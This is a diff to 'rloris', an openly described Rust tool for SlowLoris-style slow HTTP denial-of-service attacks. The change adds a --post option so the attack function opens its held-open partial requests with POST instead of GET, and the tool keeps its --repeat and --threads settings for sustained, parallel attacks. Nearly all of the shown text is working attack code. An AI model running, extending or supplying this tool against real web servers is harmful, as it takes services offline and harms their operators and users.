@@ -16,12 +16,13 @@ const USAGE: &'static str = "
 rloris - SlowLoris and other Slow HTTP DoSes in Rust
 
 Usage:
-    rloris <target> [--ssl] [--port=<port>] [--timeout=<timeout>] [--cycles=<cycles>] [--domain=<domain>] [--nofinalize] [--repeat] [--threads=<threads>]
+    rloris <target> [--ssl] [--port=<port>] [--timeout=<timeout>] [--cycles=<cycles>] [--domain=<domain>] [--nofinalize] [--repeat] [--threads=<threads>] [--post]
     rloris (-h | --help)
     rloris --version
 
 Options:
     -h --help       Show this screen.
+    --post          Use POST rather than GET as the default HTTP verb.
     --ssl           Use SSL. Changes default port to 443.
     --port=P        Use port P. Defaults to 80 for plaintext, 443 for SSL.
     --timeout=T     Total time for a single request, in milliseconds. [default: 10000]
@@ -29,7 +30,6 @@ Options:
     --domain=D      Override the domain name for SSL connections (e.g., if you're connecting to a raw IP address)
     --repeat        Perform the attack repeatedly (WARNING - Can produce a DoS condition!)
     --threads=T     The number of concurrent threads to spin off. [default: 1]
-    --version       Display version information.
 ";
 
 #[derive(Debug, RustcDecodable)]
@@ -43,6 +43,8 @@ struct Args {
     flag_domain: Option<String>,
     flag_repeat: bool,
     flag_threads: usize,
+    flag_version: bool,
+    flag_post: bool
 }
 
 #[derive(Debug, Clone)]
@@ -73,11 +75,13 @@ impl Target {
 /// which can be written to via the given `connection` (reader/writer). 
 /// `timeout` is the total time for the attack to progress, in milliseconds.
 /// `cycles` is the number of times a new fake header should be written, or 0 for no additional headers.
-fn request_attack<T: Sized + Read + Write>(connection: &mut T, timeout: u32, cycles: u32, finalize: bool) {
+/// `finalize` sets whether or not to send the terminating `\r\n`, and `post` changes the verb from GET to POST.
+fn request_attack<T: Sized + Read + Write>(connection: &mut T, timeout: u32, cycles: u32, finalize: bool, post: bool) {
     // Start a valid HTTP request
-    connection.write_all(b"GET / HTTP/1.0\r\n")
+    let initial_request = if post {b"POST / HTTP/1.0\r\n"} else {b"GET  / HTTP/1.0\r\n"};
+    connection.write_all(initial_request)
         .expect("[REQUEST] !!! Couldn't write GET request.");
-    println!("[REQUEST] Wrote GET request.");
+    println!("[REQUEST] Wrote {} request.", if post {"POST"} else {"GET"});
 
     // Delay cycle
     // Conditional here limits requests to one per ten milliseconds
@@ -118,6 +122,7 @@ fn main() {
     let repeat = args.flag_repeat;
     let threads = args.flag_threads;
     let ssl = args.flag_ssl;
+    let post = args.flag_post;
     // Extract targetting information
     let mut target = Target::new(args.arg_target, port);
 
@@ -147,9 +152,9 @@ fn main() {
 
                         let mut ssl_stream = connector.connect(target.get_domain(), tcp_stream).expect("[CONTROL] !!! Couldn't connect TLS. Did you provide a domain name, not an IP?");
                         println!("[CONTROL] Successfully connected with TLS.");
-                        request_attack(&mut ssl_stream, timeout, cycles, finalize);
+                        request_attack(&mut ssl_stream, timeout, cycles, finalize, post);
                     } else {
-                        request_attack(&mut tcp_stream, timeout, cycles, finalize)
+                        request_attack(&mut tcp_stream, timeout, cycles, finalize, post)
                     }
                 })
             );
